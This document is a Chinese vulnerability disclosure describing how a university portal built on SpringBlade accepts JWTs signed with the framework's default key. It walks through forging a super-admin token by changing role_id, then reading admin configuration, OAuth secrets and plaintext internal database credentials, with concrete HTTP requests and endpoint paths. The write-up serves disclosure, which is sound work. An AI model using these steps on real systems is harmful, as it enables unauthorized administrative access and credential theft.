

# one.xxx.edu.cn 存在门户系统的 JWT 使用框架默认签名密钥伪造超级管理员令牌漏洞，管理端配置全量可读并泄露内网数据库凭据



## 漏洞描述

门户登录由统一身份认证 CAS 完成：前端用一次性 ST 到网关换取 access_token。该令牌是 HS256 签名的 JWT，载荷 19 项声明，身份与权限信息（role_id、role_name、identity）全部放在客户端可解码的载荷里；后续每个业务请求用 Blade-Auth 请求头携带令牌，网关验签通过后按声明里的 role_id 决定能访问哪些接口。

根因有三处，实测确定：

- 签名密钥未按部署规范更换，就是 Springxxxx 框架出厂值字符串 Bxxxxx。用它对服务端下发的令牌原样重签，结果与原文逐字节一致（MD5 均为 2120fa532af554599a78eb8a2e2f5f59）；同一载荷换任何其他密钥都被服务端 401 拒绝，验签机制真实生效，问题是密钥可预测。

- 网关授权不回查角色表，直接信任令牌里的 role_id 声明。同一账号、同一会话，只把 role_id 从 1002（在校生）改成 xxx3598816738xxxxxx（SpringBlade 内置超管角色 ID），管理端接口立即放行。

- 内置超管角色 xxx598816738xxxxxx 在生产租户有效、未被禁用，知道该常量即可直接利用。


攻击者能做的事：

- 任意在册学生用自己的账号令牌离线重签出超管令牌，全程无需爆破、无需交互、无需内网位置；

- 以超管身份只读访问管理端全部配置接口（角色、机构、租户、菜单与权限位、系统参数、OAuth 应用密钥、数据源代码）；

- 从数据源接口直接读出内网 Oracle 与 MySQL 数据库的明文账号口令；

- 叠加系统参数暴露的统一初始口令 123456 与 OAuth password 授权模式，构成按学号批量换取合法令牌的风险面。




## 漏洞复现步骤


### Step 1：取得学生令牌（CAS ST 兑换）

用任意学生账号在浏览器完成统一身份认证登录，从 CAS 跳转 one.xxx.edu.cn 的 302 Location 里取一次性 ST（形如 ST-xxxx-cas01.example.org，用过即失效），向网关兑换 access_token。

PoC:

```
POST /api/blade-workbench/nobody/cas/getTokenByCasTicket HTTP/1.1  
Host: one.xxx.edu.cn  
Authorization: Basic c2FiZXI6c2FiZXJfc2VjcmV0  
Content-Type: application/json;charset=UTF-8  
  
{"modelName":"SERVICE_ONLINESERVICE","loginType":"cas","casTicket":"ST-260783-****-cas01.example.org"}

```



![](Pasted%20image%2020261103105935.png)




结果: HTTP 200，data.role_id=1002、identity=STUDENT，access_token 为 1196 字符的 HS256 JWT（有效期 86400 秒），响应里 license 字段即 powered by bladex。




![](Pasted%20image%2020261103110106.png)







### Step 2：判定签名密钥（原样重签逐字节一致）

对服务端下发的令牌不做任何修改，在本地重算签名段并与原文比对，发现加密算法是HS256，并尝试对密钥进行破解：

PoC:

```

sig    = base64url( HMAC-SHA256( header + "." + payload , key = "Bxxxxx" ) )  
重签令牌 = header + "." + payload + "." + sig

```

Yakit Codec 等价操作：JWT解析 → "secret_key":"Bxxxxx" → JWT解析签名  
比对结果：MD5(原令牌) = MD5(重签令牌) = xxx0fa532af554599a78eb8a2e2fxxxx，逐字节一致

结果: 重签结果与原令牌逐字节相同，签名密钥就是字符串 Bxxxxx（大小写敏感）。





![](Pasted%20image%2020261103110359.png)



对密钥破解后发现是springblade服务架构的默认口令Bxxxxx：

![](Pasted%20image%2020261103110626.png)

私钥密钥破解成功








### Step 3：构造超管令牌（只改 3 个声明）

在解析出的 claims 里只改 3 项权限声明，会话绑定字段原样保留，再用 Bxxxxx 重签：

PoC:

```
// claims 只改 3 项（其余 16 项一律不动）："role_id":   "1002"      →  "xxx3598816738xxxxxx"   // Springxxxxx 内置超管角色 ID  
"role_name": "xx生"    →  "xxxxxx"  
"identity":  "xxx"   →  "xxx"  
  
// 不能动：user_id / auth / authToken / uuid / tenant_id / exp（会话绑定字段，改动即失效）
```

![](Pasted%20image%2020261103110954.png)



==SpringBlade 的开源架构建库脚本里，blade_role 表预置的超级管理员记录就是这两行:==

==id = xxx3598816738xxxxxx, role_name = 'xxxxxistraxxx', role_alias = 'xxxxxisxxxxxx'==

![](Pasted%20image%2020261103111554.png)

结果: 得到 1219 字符的新令牌，载荷 role_id=xxx3598816738xxxxxx、role_name=xxxxxistrator、identity=xxxxx，user_id 仍为本人 xxx9585673xxxxxx。


声明改造对照与伪造结果:


![](Pasted%20image%2020261103111623.png)







### Step 4：同一接口 4 组令牌对照

同一请求只换 Blade-Auth 里的令牌，其余头完全一致：

PoC:

```
GET /api/blade-system/role/list HTTP/1.1  
Host: one.xxx.edu.cn  
Authorization: Basic c2FiZXI6c2FiZXJfc2VjcmV0  
Blade-Auth: Bearer <各组令牌>  
Origin: https://one.xxx.edu.cn  
Accept: application/json
```

结果：

- 1) 学生真令牌：HTTP 200，119 字节，响应为 {"msg":"未知错误！:SecureException: 请求未授权; 异常编号:2026102913334995aa94cebdc748bb85","status":1001}

- 2) 伪造超管令牌：HTTP 200，6182 字节，{"code":200,"success":true} 开头的全量角色数组，含 1000 智慧大学(school) 与 9999 管理员角色组(xxxxxistrator)

- 3) 同一伪造载荷换密钥 xxxxxisbest：HTTP 401，53 字节空鉴权错误

- 4) 同一伪造载荷换密钥 saber_secret：HTTP 401，53 字节

组 1 与组 2 唯一差别是 3 个声明值，差异只能来自授权判定读取了声明；组 2 与组 3 唯一差别是密钥，说明验签真实生效。




4 组令牌对照实测结果:

![](Pasted%20image%2020261103112156.png)

![](Pasted%20image%2020261103112209.png)










### Step 5：超管身份读取管理端配置

用伪造超管令牌对管理端配置接口逐一只读访问（每个接口取 1 次）：

PoC:

```
GET /api/blade-system/role/list HTTP/1.1  
Host: one.xxx.edu.cn  
Authorization: Basic c2FiZXI6c2FiZXJfc2VjcmV0  
Blade-Auth: Bearer <伪造超管令牌>  
Origin: https://one.xxx.edu.cn  
Accept: application/json

```
// 其余接口同头，仅换路径：dept/list、tenant/list、param/list、  
// client/list、menu/routes、menu/tree

结果：

- role/list 6182 B：角色清单（1000 智慧大学、9999 管理员角色组）；

- dept/list 690 B：机构 xxx4273095789xxxxxx 智慧校园；

- tenant/list 464 B：租户 10 智慧大学1；

- param/list 830 B：account.registerUser=true、account.initPassword=123456；

- client/list 1225 B：OAuth clientSecret 明文 sword_secret、saber_secret，password 授权模式开放，redirect_uri 为 localhost；

- menu/routes 65513 B：管理端全量路由；menu/tree 28942 B：管理端菜单树。





管理端配置读取结果汇总:

![](Pasted%20image%2020261103112451.png)

![](Pasted%20image%2020261103112508.png)




one.xxx.edu.cn平台的初始密码信息

![](Pasted%20image%2020261103112615.png)




一些敏感密钥信息

![](Pasted%20image%2020261103112632.png)




获取**OAuth** **应用凭据信息**

![](Pasted%20image%2020261103112702.png)




后台管理菜单路径表

![](Pasted%20image%2020261103112715.png)




管理端菜单树

![](Pasted%20image%2020261103112730.png)



获取重要的**数据源凭据取证：**

**Poc**：

```
GET /api/blade-develop/datasource/list HTTP/1.1
Host: one.xxx.edu.cn
Authorization: Basic c2FiZXI6c2FiZXJfc2VjcmV0
Origin: https://one.swcvc.edu.cn
Accept: application/json
Accept-Encoding: identity
Blade-Auth: Bearer PASTE_FORGED_ADMIN_TOKEN
```






### Step 6：读取内网数据库凭据

数据源管理接口在超管身份下直接明文回显内网数据库连接配置：

PoC:

```
GET /api/blade-develop/datasource/list HTTP/1.1  
Host: one.xxx.edu.cn  
Authorization: Basic c2FiZXI6c2FiZXJfc2VjcmV0  
Blade-Auth: Bearer <伪造超管令牌>  
Origin: https://one.swcvc.edu.cn  
Accept: application/json
```





结果: HTTP 200，1127 字节，返回 2 条数据源记录（完整明文样本见漏洞危害一节）。测试全程未对两个内网地址发起任何连接。

截图(数据源接口明文回显内网数据库凭据):

获取到了内网的数据库连接地址和账户密码等信息

![](Pasted%20image%2020261103112851.png)



![](Pasted%20image%2020261103112907.png)








### Step 7：边界确认

确认提权影响面没有覆盖自然人数据：

PoC:

```
GET /api/blade-system/user/page HTTP/1.1  
Host: one.xxx.edu.cn  
Authorization: Basic c2FiZXI6c2FiZXJfc2VjcmV0  
Blade-Auth: Bearer <伪造超管令牌>
```



```  
GET /api/blade-user/user/page HTTP/1.1  
Host: one.xxx.edu.cn  
Authorization: Basic c2FiZXI6c2FiZXJfc2VjcmV0  
Blade-Auth: Bearer <伪造超管令牌>
```



结果: 两个接口均 HTTP 404 No handler found，网关未挂载用户管理控制器。

用户列表接口 404 边界复核:


![](Pasted%20image%2020261103112946.png)





## 漏洞危害

- 平台控制面失守：非单点越权，任意在册学生账号把自己提权为平台超级管理员的通用通道。

- 管理端配置全量可读：角色、机构、租户、菜单与权限位、系统参数、OAuth 应用密钥、数据源配置一次取证全部取得（见复现步骤 Step 5）。

- 内网数据库凭据外泄：泛微 e-cology OA 主库账号与中间库 root 口令均为弱口令，明文凭据可直接用于后续内网利用；MySQL 连接串开启 allowMultiQueries=true，注入风险晋升为任意语句执行。

- 批量接管风险面：OAuth clientSecret 明文（sword_secret、saber_secret）且 password 授权模式开放，叠加统一初始口令 123456 与自助注册开启，构成按学号批量获取合法令牌的条件。

- 到达门槛为零：不需要口令爆破、不需要社工、不需要内网位置、不需要任何交互，全校任一在册学生账号都是入口。




































































































































































































